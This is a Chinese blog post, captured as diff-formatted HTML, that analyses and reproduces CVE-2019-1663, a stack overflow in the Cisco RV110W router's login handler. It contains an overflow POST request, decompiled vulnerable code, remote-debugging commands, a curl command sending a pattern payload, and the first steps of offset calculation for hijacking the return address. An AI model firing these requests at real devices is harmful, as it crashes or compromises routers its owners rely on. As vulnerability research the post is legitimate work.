+      <a data-url="https://tig3rhu.github.io/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/" data-id="clq9l1r3s0004ysvbh6gi7zhi" data-title="Linksys EA6100 固件解密过程" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Cisco_RV110W_堆栈缓冲区溢出漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T15:01:41.410Z" itemprop="datePublished">2023-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Cisco-RV110W-堆栈缓冲区溢出漏洞分析"><a href="#Cisco-RV110W-堆栈缓冲区溢出漏洞分析" class="headerlink" title="Cisco_RV110W_堆栈缓冲区溢出漏洞分析"></a>Cisco_RV110W_堆栈缓冲区溢出漏洞分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> 本篇文章是针对Cisco RV110W 设备的一次栈溢出漏洞分析与复现。</p>
+<p>漏洞通告：<a target="_blank" rel="noopener" href="https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20190227-rmi-cmd-ex.html">https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20190227-rmi-cmd-ex.html</a></p>
+<h2 id="0x02-漏洞触发"><a href="#0x02-漏洞触发" class="headerlink" title="0x02 漏洞触发"></a>0x02 漏洞触发</h2><p>漏洞编号：CVE-2019-1663</p>
+<p>漏洞固件版本：Cisco RV110W&lt;1.2.2.1</p>
+<p>UART 串口接入设备shell，查看设备的端口开放情况，并且cisco的web服务是可以访问，开启了443端口</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115152433365.png" alt="image-20221115152433365"></p>
+<p>登录，pwd的值使用MD5 将密码进行加密</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210726141729042.png" alt="image-20210726141729042"></p>
+<p>将payloads 更改为，并且发送请求的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 556</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;92&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;92&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://192.168.1.1/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: XSRF_TOKEN=1222440606; mlap=RGVmYXVsdDM6Ojo6Y2lzY28=</span><br><span class="line"></span><br><span class="line">submit_button=login&amp;submit_type=&amp;gui_action=&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=cisco+&amp;pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZZZ&amp;sel_lang=EN</span><br></pre></td></tr></table></figure>
+
+<p>现在我们再次来看设备的web 443服务，可以很明显的看到设备的端口已经down 了。并且设备的web 的服务也无法访问。初步判断在登录的pwd 值处发生了堆栈的缓冲区溢出的漏洞。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210726141951659.png" alt="image-20210726141951659"></p>
+<h2 id="0x02-固件分析"><a href="#0x02-固件分析" class="headerlink" title="0x02 固件分析"></a>0x02 固件分析</h2><p>由于思科的固件都是公开的，因此可以直接从思科的support站上下载固件，接着使用binwalk 解开固件包，固件使用的是Squashfs 最常见的嵌入式文件系统格式。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115152840681.png" alt="image-20221115152840681"></p>
+<p>通过固件内的二进制文件获取获取指令架构的相关信息，固件为mips 32位小端的指令架构。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shayuhuajiao@ubuntu ~/i/g/_/squashfs-root&gt; file sbin/rc</span><br><span class="line">sbin/rc: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">shayuhuajiao@ubuntu ~/i/g/_/squashfs-root&gt; file bin/busybox </span><br><span class="line">bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>
+
+<p>根据披露的漏洞信息和漏洞触发行为，漏洞产生在http 服务上，因此可以很快的定位提供http服务的 httpd 二进制文件，该文件在  &#x2F;usr&#x2F;sbin&#x2F;httpd  中</p>
+<p>使用ghidra 导入httpd</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115155911402.png" alt="image-20221115155911402"></p>
+<p><strong>漏洞点的流程</strong></p>
+<p>log_in_cgi() –&gt; login_check() —&gt; valid_user()</p>
+<p>漏洞函数是在vailid_user(char *pcParm1,char *pcParm2,char *pcParm3,int iParm4)函数，parm1 和 parm2 分别是输入的user 和password 的值，另外parm4 是enc的值。漏洞函数的传参下面会分析，这个函数中具体的漏洞点如下，首先程序会判断enc的值是否是1 ，如果不是，那就对比”enc&#x3D;” 字符串，一般来说都能触发 strcpy 函数。strcpy 函数会将pcParm2 的值复制到acStack109中，并且没有对pcParm2的长度没有限制，因此会造成acStack109[69] 的内存单元无法容纳大长度的字节，从而造成缓冲区溢出的漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">int valid_user(char *pcParm1,char *pcParm2,char *pcParm3,int iParm4)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  bool bVar1;</span><br><span class="line">  int iVar2;</span><br><span class="line">  size_t sVar3;</span><br><span class="line">  size_t sVar4;</span><br><span class="line">  int iVar5;</span><br><span class="line">  long lVar6;</span><br><span class="line">  undefined4 uVar7;</span><br><span class="line">  char *__s1;</span><br><span class="line">  char *__s1_00;</span><br><span class="line">  undefined4 local_108;</span><br><span class="line">  undefined4 local_104;</span><br><span class="line">  undefined2 local_100;</span><br><span class="line">  char acStack254 [40];</span><br><span class="line">  char acStack214 [40];</span><br><span class="line">  char acStack174 [65];</span><br><span class="line">  char acStack109 [69];</span><br><span class="line">  </span><br><span class="line">  memset(acStack254,0,0x28);</span><br><span class="line">  memset(acStack214,0,0x28);</span><br><span class="line">  memset(acStack174,0,0x41);</span><br><span class="line">  local_108 = 0;</span><br><span class="line">  local_104 = 0;</span><br><span class="line">  local_100 = 0;</span><br><span class="line">  memset(acStack109,0,0x41);  // 初始化acStack109</span><br><span class="line">  sscanf(pcParm3,&quot;%[^,],%[^,],%[^\n]&quot;,&amp;local_108,acStack214,acStack254);</span><br><span class="line">  if (iParm4 == 0) &#123; //iParm4 是enc=的值</span><br><span class="line">    iVar2 = strncmp(acStack214,&quot;enc=&quot;,4);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      md5_encode(pcParm2,acStack109);</span><br><span class="line">      sscanf(acStack214,&quot;enc=%s&quot;,acStack174);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      strcpy(acStack174,acStack214);</span><br><span class="line">      strcpy(acStack109,pcParm2);//漏洞点获取的pwd参数使用strcpy 到asStack109，没有对长度进行限制，进而产生溢出</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    iVar2 = strncmp(acStack214,&quot;enc=&quot;,4);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      sscanf(acStack214,&quot;enc=%s&quot;,acStack174);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      md5_encode(acStack214,acStack174);</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy(acStack109,pcParm2); //漏洞点获取的pwd参数使用strcpy 到asStack109，没有对长度进行限制，进而产生溢出</span><br><span class="line">  &#125;</span><br><span class="line">  sVar3 = strlen(acStack254);</span><br><span class="line">  sVar4 = strlen(pcParm1);</span><br><span class="line">  if (sVar3 == sVar4) &#123;</span><br><span class="line">    sVar3 = strlen(acStack174);</span><br><span class="line">    sVar4 = strlen(acStack109);</span><br><span class="line">    iVar2 = 0;</span><br><span class="line">    if (sVar3 == sVar4) &#123;</span><br><span class="line">      iVar5 = strcmp(acStack254,pcParm1);</span><br><span class="line">      iVar2 = 0;</span><br><span class="line">      if (iVar5 == 0) &#123;</span><br><span class="line">        iVar5 = strcmp(acStack174,acStack109);</span><br><span class="line">        iVar2 = 0;</span><br><span class="line">        if (iVar5 == 0) &#123;</span><br><span class="line">          __s1_00 = (char *)nvram_get(&quot;en_guest&quot;);</span><br><span class="line">          iVar2 = 1;</span><br><span class="line">          if (__s1_00 != (char *)0x0) &#123;</span><br><span class="line">            iVar5 = strcmp(__s1_00,&quot;0&quot;);</span><br><span class="line">            iVar2 = 1;</span><br><span class="line">            if (iVar5 == 0) &#123;</span><br><span class="line">              __s1_00 = (char *)nvram_get(&quot;http_power&quot;);</span><br><span class="line">              iVar2 = 1;</span><br><span class="line">              if (__s1_00 != (char *)0x0) &#123;</span><br><span class="line">                iVar5 = strcmp(__s1_00,&quot;r&quot;);</span><br><span class="line">                iVar2 = 1;</span><br><span class="line">                if (iVar5 == 0) goto LAB_00431a9c;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">LAB_00431a9c:</span><br><span class="line">    iVar2 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if (do_onplus != 0) &#123;</span><br><span class="line">    return iVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  if (iVar2 == 0) &#123;</span><br><span class="line">    iVar2 = nvram_get(&quot;http_client_ip&quot;);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      iVar2 = 0x487990;</span><br><span class="line">    &#125;</span><br><span class="line">    syslog(6,&quot;Invalid username or password from %s.&quot;,iVar2);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = sys_uptime();</span><br><span class="line">  __s1_00 = (char *)nvram_get(&quot;auth_time&quot;);</span><br><span class="line">  if (__s1_00 == (char *)0x0) &#123;</span><br><span class="line">    __s1_00 = &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = (char *)nvram_get(&quot;http_power&quot;);</span><br><span class="line">  if ((__s1 == (char *)0x0) || (iVar5 = strcmp(__s1,&quot;rw&quot;), iVar5 != 0)) &#123;</span><br><span class="line">    iVar5 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    __s1 = (char *)nvram_get(&quot;admin_timeout&quot;);</span><br><span class="line">    if (__s1 == (char *)0x0) &#123;</span><br><span class="line">      __s1 = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar5 = atoi(__s1);</span><br><span class="line">    if (iVar5 == 99) &#123;</span><br><span class="line">      bVar1 = false;</span><br><span class="line">      goto LAB_00431d18;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar5 = iVar5 * 0x3c;</span><br><span class="line">  &#125;</span><br><span class="line">  lVar6 = atol(__s1_00);</span><br><span class="line">  if ((iVar2 &lt; lVar6) || (bVar1 = false, iVar5 &lt;= iVar2 - lVar6)) &#123;</span><br><span class="line">    syslog(6,&quot;Administrator session timeout.&quot;);</span><br><span class="line">    bVar1 = true;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00431d18:</span><br><span class="line">  __s1_00 = (char *)nvram_get(&quot;auth_st&quot;);</span><br><span class="line">  if ((((__s1_00 == (char *)0x0) || (iVar2 = strcmp(__s1_00,&quot;1&quot;), iVar2 != 0)) ||</span><br><span class="line">      (__s1_00 = (char *)nvram_get(&quot;http_power&quot;), __s1_00 == (char *)0x0)) ||</span><br><span class="line">     ((iVar2 = strcmp(__s1_00,&quot;rw&quot;), iVar2 != 0 || (bVar1)))) &#123;</span><br><span class="line">    nvram_set(&quot;http_power&quot;,&amp;local_108);</span><br><span class="line">    iVar2 = nvram_get(0x485054);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      iVar2 = 0x487990;</span><br><span class="line">    &#125;</span><br><span class="line">    set_key_status(iVar2,&amp;DAT_0047f7d4);</span><br><span class="line">    uVar7 = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    iVar2 = strcmp((char *)&amp;local_108,&quot;rw&quot;);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      uVar7 = nvram_get(0x485054);</span><br><span class="line">      nvram_set(&quot;tmp_auth_key&quot;,uVar7);</span><br><span class="line">      uVar7 = 3;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      uVar7 = 2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return uVar7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着valid_user()函数是如何调用并触发的，根据交叉引用，valid_user 函数在login_check 函数中调用，并且valid_user 的参数也是login_check 函数需要的参数。</p>
+<p>int login_check(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)  : </p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210727105812234.png" alt="image-20210727105812234"></p>
+<p>继续查看login_check 的交叉引用，查看这些参数的传入位置，在log_in_cgi()函数中，此函数会使用get_cgi()分别获取在登录的时候输入的“user”、”pwd”的值。并且把获取到的值作为参数传给login_check()，login_check 函数可以看到调用的时候，传入了三个参数，并且查看到参数分别是user、pwd 的值。ghidra 没有像IDA一样自动显示字符串，我们可以双击 “&amp;DAT_00481470” 查看，也可以设置data为strings。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161243487.png" alt="image-20221115161243487"></p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161529938.png" alt="image-20221115161529938"></p>
+<p>具体的程序漏洞触发流程如下图所示</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211122202746989.png" alt="image-20211122202746989"></p>
+<h2 id="0x03-漏洞远程调试-漏洞利用"><a href="#0x03-漏洞远程调试-漏洞利用" class="headerlink" title="0x03 漏洞远程调试&amp;漏洞利用"></a>0x03 漏洞远程调试&amp;漏洞利用</h2><p>通过固件分析，了解了漏洞的产生点，现在开始对漏洞点进行远程调试，上传gdbserver(mips)，并开启设备中的远程调试</p>
+<p>设备端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># wget http://192.168.1.100:80/gdbserver</span><br><span class="line">Connecting to 192.168.1.101:80 (192.168.1.101:80)</span><br><span class="line">gdbserver            100% |*******************************|  1011k --:--:-- ETA</span><br><span class="line"># chmod 777 ./gdbserver</span><br><span class="line"># ps -w | grep httpd</span><br><span class="line">  348 0          6284 S   httpd </span><br><span class="line">  356 0          6416 S   httpd -S </span><br><span class="line"># ./gdbserver --attach :1234 356</span><br><span class="line">Attached; pid = 356</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"># wget http://10.10.10.100:80/gdbserver</span><br><span class="line">Connecting to 10.10.10.100:80 (10.10.10.100:80)</span><br><span class="line">gdbserver            100% |*******************************|  1011k 00:00:00 ETA</span><br><span class="line"># chmod 777 ./gdbserver </span><br><span class="line"># ./gdbserver --attach :1234 348</span><br><span class="line">Attached; pid = 348</span><br><span class="line">Listening on port 1234</span><br></pre></td></tr></table></figure>
+
+<p>调试端：使用gdb 进行远程调试，设置架构集和大小端。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q httpd</span><br><span class="line">pwndbg&gt; set architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">pwndbg&gt; set endian little </span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; target remote 192.168.1.1:1234</span><br><span class="line">Remote debugging using 192.168.1.1:1234</span><br><span class="line">Reading /usr/lib/libnvram.so from remote target...</span><br></pre></td></tr></table></figure>
+
+<h3 id="1）劫持PC"><a href="#1）劫持PC" class="headerlink" title="1）劫持PC"></a>1）劫持PC</h3><p>接下来我们要计算valid_user(）函数中局部变量acStack109到$ra的偏移量</p>
+<p>使用pattern.py 来生成随机字符</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161853464.png" alt="image-20221115161853464"></p>
+<p>在调试中 在valid_user 函数分配栈空间的指令地址处打断点  break *0x004318BC，然后启动调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; break *0x004318BC</span><br><span class="line">pwndbg&gt; continue</span><br></pre></td></tr></table></figure>
+
+<p>发送payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -k -X POST https://10.10.10.1/login.cgi -d &#x27;submit_button=login&amp;submit_type=&amp;gui_action=&amp;default_login=1&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=cisco&amp;pwd=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;sel_lang=EN&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>程序会断点在valid_user函数的序言处。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119143402853.png" alt="image-20211119143402853"></p>
+<p>根据valid_user(a1,a2,a3,a4)的定义，并且在login_check函数中调用valid_user函数的汇编可知，上面的调试的断点处，寄存器中的$A0存放user的值，$A1存放pwd的值，$A2存放enc&#x3D;的值。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119144149619.png" alt="image-20211119144149619"></p>
+<p>调试到strcpy处，strcpy将pwd的内存地址拷贝到函数的栈空间内。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119151450701.png" alt="image-20211119151450701"></p>
+<p>接着往下执行，程序会在strlen 提前中断，调试无法进行下去。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119152320374.png" alt="image-20211119152320374"></p>
+<h5 id="中断分析"><a href="#中断分析" class="headerlink" title="中断分析"></a>中断分析</h5><p>函数提前崩溃的原因是strlen()函数的参数$a0的值必须是一个有效的地址，根据汇编代码可知，在覆盖栈上的返回地址之后，会覆盖0x200+arg_0指向的栈空间内容，然后$a0会获取 0x200+arg_0 栈空间地址的内容，然后将其作为参数传递给strlen，因此0x200+arg_0 必须是一个有效的地址，但是我们刚刚传入的值是一个无效的地址，因此为了保证valid_user函数执行时，能够正常执行下去而不被破坏，就需要给strlen传入一个有效的地址。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119161913352.png" alt="image-20211119161913352"></p>
+<p>因此为了不破坏strlen函数的栈空间，需要手动计算偏移地址。</p>
+<p>根据函数的序言，可以计算出v38 到 var_s24的偏移是105个字节<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210729113044396.png" alt="image-20210729113044396"></p>
+<p>构造105*‘A’+DDDD+ZZZZ</p>
